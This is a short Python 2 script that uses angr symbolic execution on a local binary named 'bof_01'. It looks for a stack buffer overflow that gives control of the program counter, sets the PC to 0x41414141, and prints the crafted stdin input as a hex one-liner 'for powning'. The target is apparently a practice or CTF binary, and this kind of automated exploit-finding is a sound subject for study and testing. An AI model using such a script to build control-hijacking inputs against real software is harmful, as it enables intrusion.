#!/usr/bin/env python

import angr
from simuvex import s_options as so
import binascii

def fully_symbolic(state, variable):
    for i in range(state.arch.bits):
        if not state.se.symbolic(variable[i]):
            return False
    return True

p = angr.Project('./bof_01')
#extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
es = p.factory.entry_state() #add_options=extras)
pg = p.factory.path_group(es, save_unconstrained = True, threads = 8)

ep = None
while ep is None:
    pg.step()
    if len(pg.unconstrained) > 0:
        print "found some unconstrained paths, checking exploitability"
        for u in pg.unconstrained:
            if fully_symbolic(u.state, u.state.regs.pc):
                ep = u
                break
        pg.drop(stash = 'unconstrained')
print "found a path which looks exploitable"
ep.state.add_constraints(ep.state.regs.pc == ep.state.se.BVV(0x41414141, 32))
buff = ep.state.posix.dumps(0).rstrip(chr(0))
print "should overflow with input of length: %i" % len(buff)
print "proceed with powning using:"
print "python -c \"import binascii; print binascii.unhexlify(\'%s\')\"" % binascii.hexlify(buff)

